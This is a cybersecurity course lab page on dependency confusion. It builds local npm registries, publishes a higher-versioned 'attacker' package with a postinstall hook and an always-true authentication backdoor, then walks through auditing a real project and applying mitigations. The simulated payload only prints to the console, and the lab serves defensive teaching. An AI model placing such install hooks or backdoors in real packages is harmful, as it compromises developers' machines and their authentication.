---
title: "Supply Chain Attack Lab — Dependency Confusion and Package Audit"
tags: [vulnerability-research, supply-chain, lab, dependency-confusion,
  npm, pypi, sca, module-10-vulnresearch-01]
module: 10-VulnResearch-01
day: 679
prerequisites:
  - Day 678 — Dependency Confusion and Supply Chain Security
related_topics:
  - Day 680 — Kernel Module Vulnerability Research
  - Day 678 — Dependency Confusion and Supply Chain Security
---

# Day 679 — Supply Chain Attack Lab

> "Knowing that dependency confusion exists is not the same as knowing
> how to defend against it. Today you build the attacker's perspective
> by simulating the attack in a controlled environment, then you build
> the defender's perspective by auditing a real project's dependency
> tree and writing the mitigation report."
>
> — Ghost

---

## Goals

Simulate a dependency confusion attack in a local environment.
Audit a real open-source project's dependency tree using `npm audit`,
`pip-audit`, and the malicious-package heuristic scanner from Day 678.
Produce a supply chain risk report.

**Prerequisites:** Day 678.
**Estimated study time:** 4 hours.

---

## Part 1 — Simulate a Dependency Confusion Attack

### Setup: Local npm Registries

We will simulate the attack by running two local npm registries:
- **Internal registry** (Verdaccio on port 4873): holds the legitimate
  private package
- **Public registry** (Verdaccio on port 4874): holds the attacker's
  higher-versioned malicious package

```bash
# Install Verdaccio (local npm registry)
npm install -g verdaccio

# Start internal registry (port 4873)
mkdir -p /tmp/internal-registry
cat > /tmp/internal-registry/config.yaml << 'EOF'
storage: /tmp/internal-registry/storage
auth:
  htpasswd:
    file: /tmp/internal-registry/htpasswd
    max_users: 100
uplinks:
  # No uplink — internal only
server:
  keepAliveTimeout: 60
packages:
  '@acme/*':
    access: $all
    publish: $all
  '**':
    access: $all
    publish: $all
listen: 0.0.0.0:4873
EOF
verdaccio --config /tmp/internal-registry/config.yaml &
INTERNAL_PID=$!

# Start "public" registry (port 4874) — simulates npmjs.org
mkdir -p /tmp/public-registry
cp /tmp/internal-registry/config.yaml /tmp/public-registry/config.yaml
sed -i 's/4873/4874/g' /tmp/public-registry/config.yaml
sed -i 's|/tmp/internal-registry|/tmp/public-registry|g' /tmp/public-registry/config.yaml
verdaccio --config /tmp/public-registry/config.yaml &
PUBLIC_PID=$!

sleep 2
echo "[*] Internal registry: http://localhost:4873"
echo "[*] Public registry:   http://localhost:4874"
```

### Create the Legitimate Internal Package (v1.0.0)

```bash
# Create the legitimate "internal" package
mkdir -p /tmp/pkg-legit/acme-auth && cd /tmp/pkg-legit/acme-auth

cat > package.json << 'EOF'
{
  "name": "acme-auth",
  "version": "1.0.0",
  "description": "LEGITIMATE internal auth library",
  "main": "index.js",
  "scripts": {}
}
EOF

cat > index.js << 'EOF'
// LEGITIMATE internal auth library
module.exports = {
  authenticate: (user, pass) => user === "admin" && pass === "correct",
};
EOF

# Publish to internal registry only
npm publish --registry http://localhost:4873
cd /tmp
```

### Create the Attacker's Malicious Package (v9.9.9)

```bash
mkdir -p /tmp/pkg-attacker/acme-auth && cd /tmp/pkg-attacker/acme-auth

cat > package.json << 'EOF'
{
  "name": "acme-auth",
  "version": "9.9.9",
  "description": "ATTACKER package — higher version wins",
  "main": "index.js",
  "scripts": {
    "postinstall": "node -e \"console.error('[ATTACKER] postinstall running on:', require('os').hostname(), '| user:', require('os').userInfo().username)\""
  }
}
EOF

cat > index.js << 'EOF'
// MALICIOUS version — in a real attack this would exfiltrate secrets
console.error("[ATTACKER] acme-auth v9.9.9 loaded — THIS IS MALICIOUS");
module.exports = {
  authenticate: () => {
    // Simulate exfiltration (in real attack: send data to attacker server)
    console.error("[ATTACKER] Credentials would be exfiltrated here");
    return true;   // backdoor: always returns true
  },
};
EOF

# Publish to "public" registry
npm publish --registry http://localhost:4874
cd /tmp
```

### Build the Victim Application (misconfigured)

```bash
mkdir -p /tmp/victim-app && cd /tmp/victim-app

cat > package.json << 'EOF'
{
  "name": "victim-app",
  "version": "1.0.0",
  "dependencies": {
    "acme-auth": "^1.0.0"
  }
}
EOF

# MISCONFIGURED: .npmrc checks both registries
# The fallback to the "public" registry is the vulnerability
cat > .npmrc << 'EOF'
# Primary: internal registry
registry=http://localhost:4873/
# Fallback when package not found (in real configs, this would be npmjs.org)
# Simulating the misconfiguration with our "public" registry
EOF

# Install with standard config (only internal) — should work correctly:
echo "[TEST 1] Installing with ONLY internal registry:"
npm install --registry http://localhost:4873 2>&1 | tail -5
ls -la node_modules/acme-auth/

echo ""
echo "[TEST 2] Installing with BOTH registries (confused):"
# Simulate confusion: npm falls back to public if internal 404
npm install --registry http://localhost:4874 2>&1 | tail -5
ls -la node_modules/acme-auth/

echo ""
echo "[TEST 3] Which version was installed?"
cat node_modules/acme-auth/package.json | python3 -c "
import json, sys; d = json.load(sys.stdin)
print(f'Installed: {d[\"name\"]} v{d[\"version\"]}')
"
```

### Observation Log

```
SIMULATION RESULTS

Test 1 (internal registry only):
  Version installed: ______________________________________
  postinstall script ran? Y / N
  Attacker output visible? Y / N

Test 2 (confused — attacker's version wins):
  Version installed: ______________________________________
  postinstall script ran? Y / N
  Attacker output visible? Y / N

What would happen in a real attack at this point?
  ___________________________________________________________
  ___________________________________________________________
```

---

## Part 2 — Audit a Real Project's Dependencies

### Exercise: Audit an Open-Source Node.js Project

```bash
# Choose a small-to-medium open-source Node.js project.
# Suggested targets (pick one):
#   - https://github.com/expressjs/express
#   - https://github.com/chalk/chalk
#   - https://github.com/sindresorhus/execa
# For Python: httpie, requests, flask

git clone https://github.com/expressjs/express.git audit-target
cd audit-target

# 1. Run npm audit
npm install
npm audit --json > audit_results.json 2>/dev/null

# 2. Summarise
python3 << 'EOF'
import json
data = json.load(open("audit_results.json"))
vulns = data.get("vulnerabilities", {})
by_sev = {}
for v in vulns.values():
    s = v.get("severity", "unknown")
    by_sev[s] = by_sev.get(s, 0) + 1
print("Vulnerability summary:")
for sev in ["critical", "high", "moderate", "low", "info"]:
    if sev in by_sev:
        print(f"  {sev.upper():10}: {by_sev[sev]}")
print(f"\nTotal packages audited: {len(data.get('packages', {}))}")
EOF

# 3. Run the malicious package scanner from Day 678
# (Copy the scanner script here and run it against node_modules)
python3 scan_packages.py .
```

### Audit Report Template

```
SUPPLY CHAIN AUDIT REPORT

PROJECT: ____________________________ Version: ______________
Date: _____________________________ Auditor: ________________

DEPENDENCY STATISTICS
  Total direct dependencies:       _______
  Total transitive dependencies:   _______
  Total packages audited:          _______

KNOWN CVE FINDINGS
  Critical: _______
  High:     _______
  Moderate: _______
  Total:    _______

TOP 3 HIGHEST-RISK PACKAGES (by CVE severity):
  1. Package: ______________ CVE: _________ CVSS: __________
     Issue: _______________________________________________
     Recommendation: ______________________________________

  2. Package: ______________ CVE: _________ CVSS: __________
     Issue: _______________________________________________
     Recommendation: ______________________________________

  3. Package: ______________ CVE: _________ CVSS: __________
     Issue: _______________________________________________
     Recommendation: ______________________________________

MALICIOUS PACKAGE HEURISTICS
  Packages with postinstall scripts: _______
  Packages with network access in install scripts: _______
  Flags requiring manual review: _______

SUPPLY CHAIN RISK POSTURE:
  [ ] LOW    — no critical/high CVEs; lockfile in use; scoped packages
  [ ] MEDIUM — some high CVEs; lockfile present but not enforced
  [ ] HIGH   — critical CVEs present; no lockfile; unscoped packages
  [ ] CRITICAL — malicious postinstall scripts found

REMEDIATION PRIORITY:
  1. ________________________________________________________
  2. ________________________________________________________
  3. ________________________________________________________
```

---

## Part 3 — Implement Mitigations

```bash
# Mitigation 1: Scope your private packages
# Before: "acme-auth"  →  After: "@acme/auth"
# This requires org registration on npm; confusion is then impossible

# Mitigation 2: Pin the registry per scope in .npmrc
cat >> .npmrc << 'EOF'
@acme:registry=http://registry.acme.internal/
EOF

# Mitigation 3: Use npm ci (enforces lockfile) instead of npm install
npm ci   # fails if package-lock.json is missing or stale

# Mitigation 4: Verify lockfile integrity
npm audit signatures   # verifies npm registry signatures on installed packages

# Mitigation 5: Block public registry for scoped packages (Artifactory/Nexus)
# Configure the proxy to NOT forward @acme/* to public npm
# (this is a server-side configuration, not client-side)

# Mitigation 6: Use provenance attestations (npm 9+)
npm publish --provenance   # signs the publish with OIDC token from CI
```

---

## Key Takeaways

1. **Version number wins the race.** The dependency confusion attack works
   because the resolver installs the highest version. An internal package
   at v1.0.0 loses to a public malicious package at v9.9.9. The mitigations
   (scoped packages, registry pinning) prevent the resolver from even
   looking at the public registry for private package names.
2. **Postinstall scripts are code execution, full stop.** Every package
   with a `postinstall` script runs arbitrary code during `npm install`.
   There is no sandbox. The code runs as the current user on the developer's
   machine. Review them. Flag any that make network connections.
3. **The lockfile is the first line of supply chain defence.** A committed,
   integrity-checked lockfile (`package-lock.json` with `npm ci`) prevents
   a dependency from changing without a code review step. If you cannot
   run `npm ci` in CI, you are installing untrusted packages every build.
4. **SCA is continuous, not a one-time activity.** A package that is safe
   today may be compromised next week if the maintainer's account is taken
   over. Set up `dependabot`, `renovate`, or `npm audit` as a CI gate.
   Alert on new critical CVEs the day they are published.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q679.1, Q679.2 …).

---

## Navigation

← Previous: [Day 678 — Dependency Confusion and Supply Chain Security](DAY-0678-Dependency-Confusion-Supply-Chain.md)
→ Next: [Day 680 — Kernel Module Vulnerability Research](DAY-0680-Kernel-Module-Vulnerability-Research.md)
